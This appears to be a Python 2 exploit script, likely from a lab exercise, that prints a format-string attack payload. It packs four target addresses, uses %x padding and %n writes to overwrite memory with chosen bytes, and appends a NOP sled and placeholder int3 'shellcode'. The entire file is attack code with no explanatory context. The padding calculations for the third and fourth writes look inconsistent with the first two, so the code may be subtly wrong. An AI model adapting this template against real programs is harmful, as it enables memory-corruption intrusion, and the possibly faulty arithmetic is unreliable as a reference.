#!/usr/bin/python

w1 = '\x14\xc0\x04\x08JUNK'
w2 = '\x15\xc0\x04\x08JUNK'
w3 = '\x16\xc0\x04\x08JUNK'
w4 = '\x17\xc0\x04\x08JUNK'

b1 = 0xaa
b2 = 0xbb
b3 = 0xcc
b4 = 0xdd

n1 =  b1 - 0x30
n2 =  b2 - n1 - 0x30
n3 =  b3 - n2 - b1
n4 =  b4 - n3 - b2

form = '%x%x%' + str(n1) +  'x%n' + '%' + str(n2) +  'x%n' + '%' + str(n3) + 'x%n' + '%' + str(n4) + 'x%n'

nopsled = '\x90' * 100
shellcode = '\xcc' * 250

print w1 + w2 + w3 + w4 + form + nopsled + shellcode
